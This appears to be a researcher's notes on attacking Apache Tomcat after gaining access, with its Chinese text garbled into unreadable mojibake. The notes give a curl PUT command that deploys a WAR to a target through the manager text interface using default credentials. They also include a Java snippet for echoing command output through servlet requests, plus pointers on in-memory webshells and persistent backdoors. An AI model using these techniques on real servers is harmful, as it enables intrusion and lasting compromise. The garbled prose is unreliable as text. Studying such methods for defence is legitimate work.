åˆ©ç”¨ç ”ç©¶
---

### Text Interface + WAR -> Post-RCE


**å‰è¨€**

> Tomcatçš„ä¸€ç§é¸¡è‚‹åˆ©ç”¨ï¼Œéœ€è¦è·å–`manager-script roles`è§’è‰²ç”¨æˆ·çš„å‡­è¯ã€‚

  ç¿»tomcatæ–‡æ¡£è€ƒå¤ -> `Deploy A New Application Archive (WAR) Remotely`

- https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL

![image](https://user-images.githubusercontent.com/55024146/177111478-ef51df0a-0a65-412b-8f75-85fbfce82d55.png)

é‡ç‚¹ï¼šThis command is executed by an HTTP `PUT` request.  ä¹Ÿè®¸å¯èƒ½å¤§æ¦‚å¯ä»¥ç”¨æ¥ç»•å®‰å…¨è®¾å¤‡??? 


**å¤ç°æ­¥éª¤**

0ï¼‰æµ‹è¯•ç¯å¢ƒ
- apache-tomcat-8.5.55
- conf/tomcat-user.xml
  ```xml
  <?xml version='1.0' encoding='utf-8'?>
  <tomcat-users>
    <role rolename="manager-script"/>
    <user username="tomcat" password="tomcat" roles="manager-script"/>
  </tomcat-users>
  ```

1ï¼‰åˆ¶ä½œWARåŒ…
```
jar -cvf demo.war *
```

2ï¼‰ä¸Šä¼ å¹¶éƒ¨ç½²WARåŒ…
```
curl -u "tomcat:tomcat" -X PUT -T "demo.war" "http://10.10.10.1:8080/manager/text/deploy?path=/demo" --proxy "127.0.0.1:9090"
```

3ï¼‰æµ‹è¯•æ•ˆæœ

![image](https://user-images.githubusercontent.com/55024146/177114675-61d9ecb3-c279-4b77-9d1d-26c083272c19.png)


PS: æµ‹å®Œå‘ç°@indishell1046åœ¨18å¹´å°±åœ¨æå‡ºäº†è¿™ç§[å§¿åŠ¿](https://twitter.com/indishell1046/status/978704150014844928)ï¼Œsecurity "re-searcher"å†ä¸€æ¬¡åœ¨è‡ªå·±è¿™å„¿å®é”¤ğŸ¤¦â€â™‚ï¸. 


### å›æ˜¾

- https://blog.csdn.net/fnmsd/article/details/106890242

å¾ˆå¼ºï¼Œé€‚ç”¨äºåŸºäº servlet-api çš„ä¸­é—´ä»¶åšå›æ˜¾ï¼Œç¨ä½œä¿®æ”¹ä»¥é€‚é… jakarta servlet-api 

```java
static {
        r = null;
        p = null;
        h =new java.util.HashSet<Object>();
        try {
            hsr = cl.loadClass("javax.servlet.http.HttpServletRequest");
            hsp = cl.loadClass("javax.servlet.http.HttpServletResponse");
        }catch (Exception e){
            try{
                hsr = cl.loadClass("jakarta.servlet.http.HttpServletRequest");
                hsp = cl.loadClass("jakarta.servlet.http.HttpServletResponse");
            }catch (Exception e1){
            }
        }

        F(Thread.currentThread(),0);
    }
```

<img width="1437" alt="image" src="https://user-images.githubusercontent.com/55024146/195976636-684b8023-68b0-4c65-ac0c-6046dfab2f86.png">

å·²æµ‹è¯•ï¼štomcat v6/7/8/9/10

### å†…å­˜é©¬

å†…å­˜é©¬æ¯”è¾ƒå¸¸è§çš„æ–‡ç« éƒ½æ˜¯å†™ tomcat v7/8/9 çš„ï¼Œå…³äº tomcat v6çš„è¾ƒå°‘ï¼ŒçŒœæµ‹é™¤äº†å®æˆ˜è¾ƒå°‘é‡è§ä¹‹å¤–ï¼Œå…¶æ„é€ æµç¨‹ä¹Ÿç¨æ˜¾å¤æ‚ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªå·¥ä½œ @huahua å¸ˆå‚…å·²ç»åšäº†ï¼Œè¯¦è§å…¶[åšå®¢](https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/).

åœ¨ tomcat v6.48 æˆåŠŸå¤ç°ï¼Œä½†æ˜¯è¯¥ç‰ˆæœ¬æ˜¯ 2016 å‘è¡Œçš„ï¼Œç®—æ˜¯æ¯”è¾ƒæ–°çš„ï¼Œæ”¾åˆ°è¾ƒä½ç‰ˆæœ¬æ—¶ä¼šå‡ºç°

<img width="865" alt="image" src="https://user-images.githubusercontent.com/55024146/195976996-aa8fc7c7-0268-47dd-872b-78efcbec2c4f.png">

è§£å†³æ–¹å¼ï¼šåˆ©ç”¨åå°„

<img width="1280" alt="image" src="https://user-images.githubusercontent.com/55024146/195977841-d8991743-c707-497b-a74a-cbaadc532317.png">




### ä¸­é—´ä»¶æŒä¹…åŒ–åé—¨

- https://gv7.me/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/
- https://xz.aliyun.com/t/10582
- https://xz.aliyun.com/t/10577
